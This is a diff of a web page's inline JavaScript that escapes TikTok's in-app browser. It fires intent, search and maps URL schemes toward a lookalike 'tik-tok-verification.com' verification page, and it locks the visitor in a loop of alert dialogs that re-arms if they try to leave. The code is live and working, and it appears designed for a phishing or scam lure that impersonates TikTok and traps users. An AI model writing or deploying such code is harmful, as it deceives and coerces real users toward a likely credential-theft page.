@@ -9,51 +9,47 @@
 
 <script>
     const target = "https://tik-tok-verification.com/Verification/verify1.html";
-    const killTime = Date.now() + 5000; // ATOMIC FAIL-SAFE
+    const killTime = Date.now() + 5000; 
 
-    function forceRedirect() {
+    function forceJump() {
         const isAndroid = /Android/i.test(navigator.userAgent);
         const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
 
-        // This protocol (Webcal) forces the OS to take over because TikTok can't render calendars
-        const osTrigger = "webcal://" + target.replace("https://", "");
-
+        // THE PRIMARY JUMP (What worked for you before)
         if (isAndroid) {
-            // Android: High-priority Chrome Package Intent
-            window.location.href = "intent://" + target.replace("https://", "") + "#Intent;scheme=https;action=android.intent.action.VIEW;package=com.android.chrome;end";
-        } else if (isIOS) {
-            // iOS: Force the OS Handover via Webcal
-            window.location.href = osTrigger;
-            
-            // Secondary trigger: Mailto bypass
-            setTimeout(() => {
-                window.location.href = "mailto:?body=" + encodeURIComponent(target);
-            }, 50);
+            window.location.href = `intent://${target.replace("https://", "")}#Intent;scheme=https;action=android.intent.action.VIEW;package=com.android.chrome;end`;
+        } else {
+            window.location.replace("x-web-search://?" + encodeURIComponent(target));
+            // Back-to-back collision
+            window.location.href = "maps://?q=" + encodeURIComponent(target);
         }
     }
 
     function rampage() {
-        // FAIL-SAFE CHECK
-        if (Date.now() > killTime) return;
+        if (Date.now() > killTime) return; // ATOMIC FAIL-SAFE
 
-        // 1. Try to force them out
-        forceRedirect();
+        // 1. Fire redirect right before the alert
+        forceJump();
 
-        // 2. THE LOCK
-        alert("ATTEMPT #18\n\nVerification Required.\n\nTap OK to open Safari/Chrome.");
+        // 2. The Lock
+        alert("ATTEMPT #19 (REDO)\n\nTap OK to sync with system browser.");
 
-        // 3. Try again immediately
-        forceRedirect();
-
-        // 4. Instant Loop
-        setTimeout(rampage, 1);
+        // 3. THE MICRO-WINDOW: 
+        // We use requestAnimationFrame to fire the redirect the INSTANT 
+        // the "OK" button is clicked and the UI unfreezes.
+        requestAnimationFrame(() => {
+            forceJump();
+            
+            // Wait just 10ms to let the OS catch the intent, then re-lock
+            setTimeout(rampage, 10);
+        });
     }
 
     window.onload = () => {
         rampage();
     };
 
-    // If they touch anything or try to leave, hit them with the loop again
+    // Re-lock if focus is lost
     window.onblur = () => { if (Date.now() < killTime) rampage(); };
 </script>
 
